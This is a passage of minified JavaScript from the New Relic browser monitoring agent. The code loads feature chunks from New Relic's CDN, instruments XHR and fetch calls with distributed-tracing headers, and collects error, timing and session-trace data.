y(){}["setErrorHandler","finished","addToTrace","inlineHit","addRelease"].forEach((e=>h[e]=E(v,e,!0,"api"))),h.addPageAction=E(v,"addPageAction",!0,n.D.pageAction),h.setCurrentRouteName=E(v,"routeName",!0,n.D.spa),h.setPageViewName=function(t,r){if("string"==typeof t)return"/"!==t.charAt(0)&&(t="/"+t),(0,i.OP)(e).customTransaction=(r||"http://custom.transaction")+t,E(v,"setPageViewName",!0)()},h.setCustomAttribute=function(e,t){let r=arguments.length>2&&void 0!==arguments[2]&&arguments[2];if("string"==typeof e){if(["string","number"].includes(typeof t)||null===t)return b(e,t,"setCustomAttribute",r);(0,f.Z)("Failed to execute setCustomAttribute.\nNon-null value must be a string or number type, but a type of <".concat(typeof t,"> was provided."))}else(0,f.Z)("Failed to execute setCustomAttribute.\nName must be a string type, but a type of <".concat(typeof e,"> was provided."))},h.setUserId=function(e){if("string"==typeof e||null===e)return b("enduser.id",e,"setUserId",!0);(0,f.Z)("Failed to execute setUserId.\nNon-null value must be a string type, but a type of <".concat(typeof e,"> was provided."))},h.interaction=function(){return(new y).get()};var w=y.prototype={createTracer:function(e,t){var r={},i=this,a="function"==typeof t;return(0,o.p)(m+"tracer",[(0,s.z)(),e,r],i,n.D.spa,g),function(){if(p.emit((a?"":"no-")+"fn-start",[(0,s.z)(),i,a],r),a)try{return t.apply(this,arguments)}catch(e){throw p.emit("fn-err",[arguments,this,"string"==typeof e?new Error(e):e],r),e}finally{p.emit("fn-end",[(0,s.z)()],r)}}}};function E(e,t,r,i){return function(){return(0,o.p)(l.xS,["API/"+t+"/called"],void 0,n.D.metrics,g),i&&(0,o.p)(e+t,[(0,s.z)(),...arguments],r?null:this,i,g),r?void 0:this}}function A(){r.e(439).then(r.bind(r,5692)).then((t=>{let{setAPI:r}=t;r(e),(0,c.L)(e,"api")})).catch((()=>(0,f.Z)("Downloading runtime APIs failed...")))}return["actionText","setName","setAttribute","save","ignore","onEnd","getContext","end","get"].forEach((e=>{w[e]=E(m,e,void 0,n.D.spa)})),h.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),(0,o.p)(l.xS,["API/noticeError/called"],void 0,n.D.metrics,g),(0,o.p)("err",[e,(0,s.z)(),!1,t],void 0,n.D.jserrors,g)},d.v6?A():(0,u.b)((()=>A()),!0),h}(e,y);return(0,h.Qy)(e,D,"api"),(0,h.Qy)(e,T,"exposed"),(0,h.EZ)("activatedFeatures",m),(0,h.EZ)("setToken",(t=>function(e,t){var r=a.ee.get(t);e&&"object"==typeof e&&((0,p.D)(e,(function(e,t){if(!t)return(v[e]||[]).forEach((t=>{(0,o.p)("block-"+e,[],void 0,t,r)}));m[e]||((0,o.p)("feat-"+e,[],void 0,v[e],r),m[e]=!0)})),(0,c.L)(t,n.D.pageViewEvent))}(t,e))),D}},909:(e,t,r)=>{"use strict";r.d(t,{Z:()=>i,q:()=>o});var n=r(2325);function i(e){switch(e){case n.D.ajax:return[n.D.jserrors];case n.D.sessionTrace:return[n.D.ajax,n.D.pageViewEvent];case n.D.pageViewTiming:return[n.D.pageViewEvent];default:return[]}}function o(e){return e===n.D.jserrors?[]:["auto"]}},2325:(e,t,r)=>{"use strict";r.d(t,{D:()=>n,p:()=>i});const n={ajax:"ajax",jserrors:"jserrors",metrics:"metrics",pageAction:"page_action",pageViewEvent:"page_view_event",pageViewTiming:"page_view_timing",sessionTrace:"session_trace",spa:"spa"},i={[n.pageViewEvent]:1,[n.pageViewTiming]:2,[n.metrics]:3,[n.jserrors]:4,[n.ajax]:5,[n.sessionTrace]:6,[n.pageAction]:7,[n.spa]:8}},8683:e=>{e.exports=function(e,t,r){t||(t=0),void 0===r&&(r=e?e.length:0);for(var n=-1,i=r-t||0,o=Array(i<0?0:i);++n<i;)o[n]=e[t+n];return o}}},n={};function i(e){var t=n[e];if(void 0!==t)return t.exports;var o=n[e]={exports:{}};return r[e](o,o.exports,i),o.exports}i.m=r,i.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return i.d(t,{a:t}),t},i.d=(e,t)=>{for(var r in t)i.o(t,r)&&!i.o(e,r)&&Object.defineProperty(e,r,{enumerable:!0,get:t[r]})},i.f={},i.e=e=>Promise.all(Object.keys(i.f).reduce(((t,r)=>(i.f[r](e,t),t)),[])),i.u=e=>(({78:"page_action-aggregate",147:"metrics-aggregate",193:"session_trace-aggregate",242:"session-manager",317:"jserrors-aggregate",348:"page_view_timing-aggregate",439:"async-api",729:"lazy-loader",786:"page_view_event-aggregate",873:"spa-aggregate",898:"ajax-aggregate"}[e]||e)+"."+{78:"64dc4751",147:"c2ad263a",193:"c0ef217a",242:"2a8d47d1",317:"017d6ea4",348:"ddd91465",439:"ad3273bd",729:"c8cd494b",786:"5a238c1f",873:"342172b1",875:"2c240adb",898:"666f66ea"}[e]+"-1.232.0.min.js"),i.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),e={},t="NRBA:",i.l=(r,n,o,a)=>{if(e[r])e[r].push(n);else{var s,c;if(void 0!==o)for(var u=document.getElementsByTagName("script"),d=0;d<u.length;d++){var f=u[d];if(f.getAttribute("src")==r||f.getAttribute("data-webpack")==t+o){s=f;break}}s||(c=!0,(s=document.createElement("script")).charset="utf-8",s.timeout=120,i.nc&&s.setAttribute("nonce",i.nc),s.setAttribute("data-webpack",t+o),s.src=r),e[r]=[n];var l=(t,n)=>{s.onerror=s.onload=null,clearTimeout(h);var i=e[r];if(delete e[r],s.parentNode&&s.parentNode.removeChild(s),i&&i.forEach((e=>e(n))),t)return t(n)},h=setTimeout(l.bind(null,void 0,{type:"timeout",target:s}),12e4);s.onerror=l.bind(null,s.onerror),s.onload=l.bind(null,s.onload),c&&document.head.appendChild(s)}},i.r=e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.j=797,i.p="https://js-agent.newrelic.com/",(()=>{var e={797:0,201:0};i.f.j=(t,r)=>{var n=i.o(e,t)?e[t]:void 0;if(0!==n)if(n)r.push(n[2]);else{var o=new Promise(((r,i)=>n=e[t]=[r,i]));r.push(n[2]=o);var a=i.p+i.u(t),s=new Error;i.l(a,(r=>{if(i.o(e,t)&&(0!==(n=e[t])&&(e[t]=void 0),n)){var o=r&&("load"===r.type?"missing":r.type),a=r&&r.target&&r.target.src;s.message="Loading chunk "+t+" failed.\n("+o+": "+a+")",s.name="ChunkLoadError",s.type=o,s.request=a,n[1](s)}}),"chunk-"+t,t)}};var t=(t,r)=>{var n,o,[a,s,c]=r,u=0;if(a.some((t=>0!==e[t]))){for(n in s)i.o(s,n)&&(i.m[n]=s[n]);if(c)c(i)}for(t&&t(r);u<a.length;u++)o=a[u],i.o(e,o)&&e[o]&&e[o][0](),e[o]=0},r=window.webpackChunkNRBA=window.webpackChunkNRBA||[];r.forEach(t.bind(null,0)),r.push=t.bind(null,r.push.bind(r))})();var o={};(()=>{"use strict";i.r(o);var e=i(2325),t=i(2919);const r=Object.values(e.D);function n(e){const n={};return r.forEach((r=>{n[r]=function(e,r){return!1!==(0,t.Mt)(r,"".concat(e,".enabled"))}(r,e)})),n}var a=i(2384),s=i(909),c=i(9252),u=i(8768),d=i(4329),f=i(1509),l=i(2650),h=i(2374),g=i(8610);class p extends f.W{constructor(e,t,r){let n=!(arguments.length>3&&void 0!==arguments[3])||arguments[3];super(e,t,r),this.hasAggregator=!1,this.auto=n,this.abortHandler,n&&(0,d.R)(e,r)}importAggregator(){if(this.hasAggregator||!this.auto)return;this.hasAggregator=!0;const e=async()=>{try{const{setupAgentSession:e}=await i.e(242).then(i.bind(i,2011));e(this.agentIdentifier);const{lazyLoader:t}=await i.e(729).then(i.bind(i,8110)),{Aggregate:r}=await t(this.featureName,"aggregate");new r(this.agentIdentifier,this.aggregator)}catch(e){(0,g.Z)("Downloading ".concat(this.featureName," failed..."),e),this.abortHandler?.()}};h.v6?e():(0,l.b)((()=>e()),!0)}}var v=i(2484),m=i(2053);class b extends p{static featureName=v.t9;constructor(r,n){let i=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];if(super(r,n,v.t9,i),("undefined"==typeof PerformanceNavigationTiming||u.T)&&"undefined"!=typeof PerformanceTiming){const n=(0,t.OP)(r);n[v.Dz]=Math.max(Date.now()-n.offset,0),(0,l.K)((()=>n[v.qw]=Math.max((0,m.z)()-n[v.Dz],0))),(0,l.b)((()=>{const t=(0,m.z)();n[v.OJ]=Math.max(t-n[v.Dz],0),(0,c.p)("timing",["load",t],void 0,e.D.pageViewTiming,this.ee)}))}this.importAggregator()}}var y=i(9557),w=i(7022);class E extends y.w{constructor(e){super(e),this.aggregatedData={}}store(e,t,r,n,i){var o=this.getBucket(e,t,r,i);return o.metrics=function(e,t){t||(t={count:0});return t.count+=1,(0,w.D)(e,(function(e,r){t[e]=A(r,t[e])})),t}(n,o.metrics),o}merge(e,t,r,n,i){var o=this.getBucket(e,t,n,i);if(o.metrics){var a=o.metrics;a.count+=r.count,(0,w.D)(r,(function(e,t){if("count"!==e){var n=a[e],i=r[e];i&&!i.c?a[e]=A(i.t,n):a[e]=function(e,t){if(!t)return e;t.c||(t=x(t.t));return t.min=Math.min(e.min,t.min),t.max=Math.max(e.max,t.max),t.t+=e.t,t.sos+=e.sos,t.c+=e.c,t}(i,a[e])}}))}else o.metrics=r}storeMetric(e,t,r,n){var i=this.getBucket(e,t,r);return i.stats=A(n,i.stats),i}getBucket(e,t,r,n){this.aggregatedData[e]||(this.aggregatedData[e]={});var i=this.aggregatedData[e][t];return i||(i=this.aggregatedData[e][t]={params:r||{}},n&&(i.custom=n)),i}get(e,t){return t?this.aggregatedData[e]&&this.aggregatedData[e][t]:this.aggregatedData[e]}take(e){for(var t={},r="",n=!1,i=0;i<e.length;i++)t[r=e[i]]=T(this.aggregatedData[r]),t[r].length&&(n=!0),delete this.aggregatedData[r];return n?t:null}}function A(e,t){return null==e?function(e){e?e.c++:e={c:1};return e}(t):t?(t.c||(t=x(t.t)),t.c+=1,t.t+=e,t.sos+=e*e,e>t.max&&(t.max=e),e<t.min&&(t.min=e),t):{t:e}}function x(e){return{t:e,min:e,max:e,sos:e*e,c:1}}function T(e){return"object"!=typeof e?[]:(0,w.D)(e,_)}function _(e,t){return t}var D=i(6797),N=i(5526),S=i(2438);var O=i(6998),j=i(8544),R=i(6382);class C extends p{static featureName=R.t;constructor(e,r){let n=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];super(e,r,R.t,n),h.il&&((0,t.OP)(e).initHidden=Boolean("hidden"===document.visibilityState),(0,O.N)((()=>(0,c.p)("docHidden",[(0,m.z)()],void 0,R.t,this.ee)),!0),(0,j.bP)("pagehide",(()=>(0,c.p)("winPagehide",[(0,m.z)()],void 0,R.t,this.ee))),this.importAggregator())}}const P=Boolean(h._A?.Worker),I=Boolean(h._A?.SharedWorker),k=Boolean(h._A?.navigator?.serviceWorker);let H,L,z;var B=i(6034);class M extends p{static featureName=B.t9;constructor(t,r){let n=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];super(t,r,B.t9,n),function(e){if(!H){if(P){H=Worker;try{h._A.Worker=r(H,"Dedicated")}catch(e){o(e,"Dedicated")}if(I){L=SharedWorker;try{h._A.SharedWorker=r(L,"Shared")}catch(e){o(e,"Shared")}}else n("Shared");if(k){z=navigator.serviceWorker.register;try{h._A.navigator.serviceWorker.register=(t=z,function(){for(var e=arguments.length,r=new Array(e),n=0;n<e;n++)r[n]=arguments[n];return i("Service",r[1]?.type),t.apply(navigator.serviceWorker,r)})}catch(e){o(e,"Service")}}else n("Service");var t;return}n("All")}function r(e,t){return"undefined"==typeof Proxy?e:new Proxy(e,{construct:(e,r)=>(i(t,r[1]?.type),new e(...r))})}function n(t){h.v6||e("Workers/".concat(t,"/Unavailable"))}function i(t,r){e("Workers/".concat(t,"module"===r?"/Module":"/Classic"))}function o(t,r){e("Workers/".concat(r,"/SM/Unsupported")),(0,g.Z)("NR Agent: Unable to capture ".concat(r," workers."),t)}}((t=>(0,c.p)(B.xS,[t],void 0,e.D.metrics,this.ee))),this.importAggregator()}}var F,U=i(3916),q=i(7264),G=(i(8683),i(3752)),V={};try{F=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(V.console=!0,-1!==F.indexOf("dev")&&(V.dev=!0),-1!==F.indexOf("nr_dev")&&(V.nrDev=!0))}catch(e){}function W(e){try{V.console&&W(e)}catch(e){}}V.nrDev&&G.ee.on("internal-error",(function(e){W(e.stack)})),V.dev&&G.ee.on("fn-err",(function(e,t,r){W(r.stack)})),V.dev&&(W("NR AGENT IN DEVELOPMENT MODE"),W("flags: "+(0,w.D)(V,(function(e,t){return e})).join(", ")));var X=i(8322);class Z extends p{static featureName=X.t;constructor(r,n){let i=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];super(r,n,X.t,i),this.skipNext=0;try{this.removeOnAbort=new AbortController}catch(e){}const o=this;o.ee.on("fn-start",(function(e,t,r){o.abortHandler&&(o.skipNext+=1)})),o.ee.on("fn-err",(function(e,t,r){o.abortHandler&&!r[X.A]&&((0,U.X)(r,X.A,(function(){return!0})),this.thrown=!0,Y(r,void 0,o.ee))})),o.ee.on("fn-end",(function(){o.abortHandler&&!this.thrown&&o.skipNext>0&&(o.skipNext-=1)})),o.ee.on("internal-error",(function(t){(0,c.p)("ierr",[t,(0,m.z)(),!0],void 0,e.D.jserrors,o.ee)})),this.origOnerror=h._A.onerror,h._A.onerror=this.onerrorHandler.bind(this),h._A.addEventListener("unhandledrejection",(t=>{const r=function(e){let t="Unhandled Promise Rejection: ";if(e instanceof Error)try{return e.message=t+e.message,e}catch(t){return e}if(void 0===e)return new Error(t);try{return new Error(t+(0,S.P)(e))}catch(e){return new Error(t)}}(t.reason);(0,c.p)("err",[r,(0,m.z)(),!1,{unhandledPromiseRejection:1}],void 0,e.D.jserrors,this.ee)}),(0,j.m$)(!1,this.removeOnAbort?.signal)),(0,q.gy)(this.ee),(0,q.BV)(this.ee),(0,q.em)(this.ee),(0,t.OP)(r).xhrWrappable&&(0,q.Kf)(this.ee),this.abortHandler=this.#e,this.importAggregator()}#e(){this.removeOnAbort?.abort(),this.abortHandler=void 0}onerrorHandler(t,r,n,i,o){"function"==typeof this.origOnerror&&this.origOnerror(...arguments);try{this.skipNext?this.skipNext-=1:Y(o||new $(t,r,n),!0,this.ee)}catch(t){try{(0,c.p)("ierr",[t,(0,m.z)(),!0],void 0,e.D.jserrors,this.ee)}catch(e){}}return!1}}function $(e,t,r){this.message=e||"Uncaught error with no additional information",this.sourceURL=t,this.line=r}function Y(t,r,n){var i=r?null:(0,m.z)();(0,c.p)("err",[t,i],void 0,e.D.jserrors,n)}let Q=1;const K="nr@id";function J(e){const t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===h._A?0:(0,U.X)(e,K,(function(){return Q++}))}var ee=i(9071);function te(e){if("string"==typeof e&&e.length)return e.length;if("object"==typeof e){if("undefined"!=typeof ArrayBuffer&&e instanceof ArrayBuffer&&e.byteLength)return e.byteLength;if("undefined"!=typeof Blob&&e instanceof Blob&&e.size)return e.size;if(!("undefined"!=typeof FormData&&e instanceof FormData))try{return(0,S.P)(e).length}catch(e){return}}}var re=i(6368);class ne{constructor(e){this.agentIdentifier=e,this.generateTracePayload=this.generateTracePayload.bind(this),this.shouldGenerateTrace=this.shouldGenerateTrace.bind(this)}generateTracePayload(e){if(!this.shouldGenerateTrace(e))return null;var r=(0,t.DL)(this.agentIdentifier);if(!r)return null;var n=(r.accountID||"").toString()||null,i=(r.agentID||"").toString()||null,o=(r.trustKey||"").toString()||null;if(!n||!i)return null;var a=(0,N.M)(),s=(0,N.Ht)(),c=Date.now(),u={spanId:a,traceId:s,timestamp:c};return(e.sameOrigin||this.isAllowedOrigin(e)&&this.useTraceContextHeadersForCors())&&(u.traceContextParentHeader=this.generateTraceContextParentHeader(a,s),u.traceContextStateHeader=this.generateTraceContextStateHeader(a,c,n,i,o)),(e.sameOrigin&&!this.excludeNewrelicHeader()||!e.sameOrigin&&this.isAllowedOrigin(e)&&this.useNewrelicHeaderForCors())&&(u.newrelicHeader=this.generateTraceHeader(a,s,c,n,i,o)),u}generateTraceContextParentHeader(e,t){return"00-"+t+"-"+e+"-01"}generateTraceContextStateHeader(e,t,r,n,i){return i+"@nr=0-1-"+r+"-"+n+"-"+e+"----"+t}generateTraceHeader(e,t,r,n,i,o){if(!("function"==typeof h._A?.btoa))return null;var a={v:[0,1],d:{ty:"Browser",ac:n,ap:i,id:e,tr:t,ti:r}};return o&&n!==o&&(a.d.tk=o),btoa((0,S.P)(a))}shouldGenerateTrace(e){return this.isDtEnabled()&&this.isAllowedOrigin(e)}isAllowedOrigin(e){var r=!1,n={};if((0,t.Mt)(this.agentIdentifier,"distributed_tracing")&&(n=(0,t.P_)(this.agentIdentifier).distributed_tracing),e.sameOrigin)r=!0;else if(n.allowed_origins instanceof Array)for(var i=0;i<n.allowed_origins.length;i++){var o=(0,re.e)(n.allowed_origins[i]);if(e.hostname===o.hostname&&e.protocol===o.protocol&&e.port===o.port){r=!0;break}}return r}isDtEnabled(){var e=(0,t.Mt)(this.agentIdentifier,"distributed_tracing");return!!e&&!!e.enabled}excludeNewrelicHeader(){var e=(0,t.Mt)(this.agentIdentifier,"distributed_tracing");return!!e&&!!e.exclude_newrelic_header}useNewrelicHeaderForCors(){var e=(0,t.Mt)(this.agentIdentifier,"distributed_tracing");return!!e&&!1!==e.cors_use_newrelic_header}useTraceContextHeadersForCors(){var e=(0,t.Mt)(this.agentIdentifier,"distributed_tracing");return!!e&&!!e.cors_use_tracecontext_headers}}var ie=i(8675),oe=["load","error","abort","timeout"],ae=oe.length,se=t.Yu.REQ,ce=h._A.XMLHttpRequest;class ue extends p{static featureName=ie.t;constructor(r,n){let i=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];super(r,n,ie.t,i),(0,t.OP)(r).xhrWrappable&&(this.dt=new ne(r),this.handler=(e,t,r,n)=>(0,c.p)(e,t,r,n,this.ee),(0,q.u5)(this.ee),(0,q.Kf)(this.ee),function(r,n,i,o){function a(e){var t=this;t.totalCbs=0,t.called=0,t.cbTime=0,t.end=x,t.ended=!1,t.xhrGuids={},t.lastSize=null,t.loadCaptureCalled=!1,t.params=this.params||{},t.metrics=this.metrics||{},e.addEventListener("load",(function(r){_(t,e)}),(0,j.m$)(!1)),ee.I||e.addEventListener("progress",(function(e){t.lastSize=e.loaded}),(0,j.m$)(!1))}function s(e){this.params={method:e[0]},T(this,e[1]),this.metrics={}}function c(e,n){var i=(0,t.DL)(r);"xpid"in i&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",i.xpid);var a=o.generateTracePayload(this.parsedOrigin);if(a){var s=!1;a.newrelicHeader&&(n.setRequestHeader("newrelic",a.newrelicHeader),s=!0),a.traceContextParentHeader&&(n.setRequestHeader("traceparent",a.traceContextParentHeader),a.traceContextStateHeader&&n.setRequestHeader("tracestate",a.traceContextStateHeader),s=!0),s&&(this.dt=a)}}function u(e,t){var r=this.metrics,i=e[0],o=this;if(r&&i){var a=te(i);a&&(r.txSize=a)}this.startTime=(0,m.z)(),this.listener=function(e){try{"abort"!==e.type||o.loadCaptureCalled||(o.params.aborted=!0),("load"!==e.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof t.onload)&&"function"==typeof o.end)&&o.end(t)}catch(e){try{n.emit("internal-error",[e])}catch(e){}}};for(var s=0;s<ae;s++)t.addEventListener(oe[s],this.listener,(0,j.m$)(!1))}function d(e,t,r){this.cbTime+=e,t?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof r.onload||"function"!=typeof this.end||this.end(r)}function f(e,t){var r=""+J(e)+!!t;this.xhrGuids&&!this.xhrGuids[r]&&(this.xhrGuids[r]=!0,this.totalCbs+=1)}function l(e,t){var r=""+J(e)+!!t;this.xhrGuids&&this.xhrGuids[r]&&(delete this.xhrGuids[r],this.totalCbs-=1)}function g(){this.endTime=(0,m.z)()}function p(e,t){t instanceof ce&&"load"===e[0]&&n.emit("xhr-load-added",[e[1],e[2]],t)}function v(e,t){t instanceof ce&&"load"===e[0]&&n.emit("xhr-load-removed",[e[1],e[2]],t)}function b(e,t,r){t instanceof ce&&("onload"===r&&(this.onload=!0),("load"===(e[0]&&e[0].type)||this.onload)&&(this.xhrCbStart=(0,m.z)()))}function y(e,t){this.xhrCbStart&&n.emit("xhr-cb-time",[(0,m.z)()-this.xhrCbStart,this.onload,t],t)}function w(e){var t,r=e[1]||{};"string"==typeof e[0]?t=e[0]:e[0]&&e[0].url?t=e[0].url:h._A?.URL&&e[0]&&e[0]instanceof URL&&(t=e[0].href),t&&(this.parsedOrigin=(0,re.e)(t),this.sameOrigin=this.parsedOrigin.sameOrigin);var n=o.generateTracePayload(this.parsedOrigin);if(n&&(n.newrelicHeader||n.traceContextParentHeader))if("string"==typeof e[0]||h._A?.URL&&e[0]&&e[0]instanceof URL){var i={};for(var a in r)i[a]=r[a];i.headers=new Headers(r.headers||{}),s(i.headers,n)&&(this.dt=n),e.length>1?e[1]=i:e.push(i)}else e[0]&&e[0].headers&&s(e[0].headers,n)&&(this.dt=n);function s(e,t){var r=!1;return t.newrelicHeader&&(e.set("newrelic",t.newrelicHeader),r=!0),t.traceContextParentHeader&&(e.set("traceparent",t.traceContextParentHeader),t.traceContextStateHeader&&e.set("tracestate",t.traceContextStateHeader),r=!0),r}}function E(e,t){this.params={},this.metrics={},this.startTime=(0,m.z)(),this.dt=t,e.length>=1&&(this.target=e[0]),e.length>=2&&(this.opts=e[1]);var r,n=this.opts||{},i=this.target;"string"==typeof i?r=i:"object"==typeof i&&i instanceof se?r=i.url:h._A?.URL&&"object"==typeof i&&i instanceof URL&&(r=i.href),T(this,r);var o=(""+(i&&i instanceof se&&i.method||n.method||"GET")).toUpperCase();this.params.method=o,this.txSize=te(n.body)||0}function A(t,r){var n;this.endTime=(0,m.z)(),this.params||(this.params={}),this.params.status=r?r.status:0,"string"==typeof this.rxSize&&this.rxSize.length>0&&(n=+this.rxSize);var o={txSize:this.txSize,rxSize:n,duration:(0,m.z)()-this.startTime};i("xhr",[this.params,o,this.startTime,this.endTime,"fetch"],this,e.D.ajax)}function x(t){var r=this.params,n=this.metrics;if(!this.ended){this.ended=!0;for(var o=0;o<ae;o++)t.removeEventListener(oe[o],this.listener,!1);r.aborted||(n.duration=(0,m.z)()-this.startTime,this.loadCaptureCalled||4!==t.readyState?null==r.status&&(r.status=0):_(this,t),n.cbTime=this.cbTime,i("xhr",[r,n,this.startTime,this.endTime,"xhr"],this,e.D.ajax))}}function T(e,t){var r=(0,re.e)(t),n=e.params;n.hostname=r.hostname,n.port=r.port,n.protocol=r.protocol,n.host=r.hostname+":"+r.port,n.pathname=r.pathname,e.parsedOrigin=r,e.sameOrigin=r.sameOrigin}function _(e,t){e.params.status=t.status;var r=function(e,t){var r=e.responseType;return"json"===r&&null!==t?t:"arraybuffer"===r||"blob"===r||"json"===r?te(e.response):"text"===r||""===r||void 0===r?te(e.responseText):void 0}(t,e.lastSize);if(r&&(e.metrics.rxSize=r),e.sameOrigin){var n=t.getResponseHeader("X-NewRelic-App-Data");n&&(e.params.cat=n.split(", ").pop())}e.loadCaptureCalled=!0}n.on("new-xhr",a),n.on("open-xhr-start",s),n.on("open-xhr-end",c),n.on("send-xhr-start",u),n.on("xhr-cb-time",d),n.on("xhr-load-added",f),n.on("xhr-load-removed",l),n.on("xhr-resolved",g),n.on("addEventListener-end",p),n.on("removeEventListener-end",v),n.on("fn-end",y),n.on("fetch-before-start",w),n.on("fetch-start",E),n.on("fn-start",b),n.on("fetch-done",A)}(r,this.ee,this.handler,this.dt),this.importAggregator())}}var de=i(6408),fe=i(2628);const{BST_RESOURCE:le,BST_TIMER:he,END:ge,FEATURE_NAME:pe,FN_END:ve,FN_START:me,ADD_EVENT_LISTENER:be,PUSH_STATE:ye,RESOURCE:we,RESOURCE_TIMING_BUFFER_FULL:Ee,START:Ae,ORIG_EVENT:xe}=fe,Te="clearResourceTimings";var _e=i(755);const{FEATURE_NAME:De,START:Ne,END:Se,BODY:Oe,CB_END:je,JS_TIME:Re,FETCH:Ce,FN_START:Pe,CB_START:Ie,FN_END:ke}=_e;var He=i(6486);class Le extends p{static featureName=He.t;constructor(e,t){let r=!(arguments.length>2&&void 0!==arguments[2])||arguments[2];super(e,t,He.t,r),this.importAggregator()}}new class{constructor(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:(0,N.ky)(16);this.agentIdentifier=t,this.sharedAggregator=new E({agentIdentifier:this.agentIdentifier}),this.features={},this.desiredFeatures=new Set(e.features||[]),this.desiredFeatures.add(b),Object.assign(this,(0,a.j)(this.agentIdentifier,e,e.loaderType||"agent")),this.start()}get config(){return{info:(0,t.C5)(this.agentIdentifier),init:(0,t.P_)(this.agentIdentifier),loader_config:(0,t.DL)(this.agentIdentifier),runtime:(0,t.OP)(this.agentIdentifier)}}start(){const t="features";try{const r=n(this.agentIdentifier),i=Array.from(this.desiredFeatures);i.sort(((t,r)=>e.p[t.featureName]-e.p[r.featureName])),i.forEach((t=>{if(r[t.featureName]||t.featureName===e.D.pageViewEvent){const e=(0,s.Z)(t.featureName);e.every((e=>r[e]))||(0,g.Z)("".concat(t.featureName," is enabled but one or more dependent features has been disabled (").concat((0,S.P)(e),"). This may cause unintended consequences or missing data...")),this.features[t.featureName]=new t(this.agentIdentifier,this.sharedAggregator)}})),(0,D.Qy)(this.agentIdentifier,this.features,t)}catch(e){(0,g.Z)("Failed to initialize all enabled instrument classes (agent aborted) -",e);for(const e in this.features)this.features[e].abortHandler?.();const r=(0,D.fP)();return delete r.initializedAgents[this.agentIdentifier]?.api,delete r.initializedAgents[this.agentIdentifier]?.[t],delete this.sharedAggregator,r.ee?.abort(),delete r.ee?.get(this.agentIdentifier),!1}}}({features:[ue,b,C,class extends p{static featureName=pe;constructor(t,r){if(super(t,r,pe,!(arguments.length>2&&void 0!==arguments[2])||arguments[2]),!h.il)return;const n=this.ee;this.timerEE=(0,q.BV)(n),this.rafEE=(0,q.gy)(n),(0,q.QU)(n),(0,q.em)(n),n.on(me,(function(e,t){e[0]instanceof xe&&(this.bstStart=(0,m.z)())})),n.on(ve,(function(t,r){var i=t[0];i instanceof xe&&(0,c.p)("bst",[i,r,this.bstStart,(0,m.z)()],void 0,e.D.sessionTrace,n)})),this.timerEE.on(me,(function(e,t,r){this.bstStart=(0,m.z)(),this.bstType=r})),this.timerEE.on(ve,(function(t,r){(0,c.p)(he,[r,this.bstStart,(0,m.z)(),this.bstType],void 0,e.D.sessionTrace,n)})),this.rafEE.on(me,(function(){this.bstStart=(0,m.z)()})),this.rafEE.on(ve,(function(t,r){(0,c.p)(he,[r,this.bstStart,(0,m.z)(),"requestAnimationFrame"],void 0,e.D.sessionTrace,n)})),n.on(ye+Ae,(function(e){this.time=(0,m.z)(),this.startPath=location.pathname+location.hash})),n.on(ye+ge,(function(t){(0,c.p)("bstHist",[location.pathname+location.hash,this.startPath,this.time],void 0,e.D.sessionTrace,n)})),(0,de.W)()?((0,c.p)(le,[window.performance.getEntriesByType("resource")],void 0,e.D.sessionTrace,n),function(){var t=new PerformanceObserver(((t,r)=>{var i=t.getEntries();(0,c.p)(le,[i],void 0,e.D.sessionTrace,n)}));try{t.observe({entryTypes:["resource"]})}catch(e){}}()):window.performance[Te]&&window.performance[be]&&window.performance.addEventListener(Ee,this.onResourceTimingBufferFull,(0,j.m$)(!1)),document.addEventListener("scroll",this.noOp,(0,j.m$)(!1)),document.addEventListener("keypress",this.noOp,(0,j.m$)(!1)),document.addEventListener("click",this.noOp,(0,j.m$)(!1)),this.abortHandler=this.#e,this.importAggregator()}#e(){window.performance.removeEventListener(Ee,this.onResourceTimingBufferFull,!1),this.abortHandler=void 0}noOp(e){}onResourceTimingBufferFull(t){if((0,c.p)(le,[window.performance.getEntriesByType(we)],void 0,e.D.sessionTrace,this.ee),window.performance[Te])try{window.performance.removeEventListener(Ee,this.onResourceTimingBufferFull,!1)}catch(e){}}},M,Le,Z,class extends p{static featureName=De;constructor(e,r){if(super(e,r,De,!(arguments.length>2&&void 0!==arguments[2])||arguments[2]),!h.il)return;if(!(0,t.OP)(e).xhrWrappable)return;try{this.removeOnAbort=new AbortController}catch(e){}let n,i=0;const o=this.ee.get("tracer"),a=(0,q._L)(this.ee),s=(0,q.Lg)(this.ee),c=(0,q.BV)(this.ee),u=(0,q.Kf)(this.ee),d=this.ee.get("events"),f=(0,q.u5)(this.ee),l=(0,q.QU)(this.ee),g=(0,q.Gm)(this.ee);function p(e,t){l.emit("newURL",[""+window.location,t])}function v(){i++,n=window.location.hash,this[Pe]=(0,m.z)()}function b(){i--,window.location.hash!==n&&p(0,!0);var e=(0,m.z)();this[Re]=~~this[Re]+e-this[Pe],this[ke]=e}function 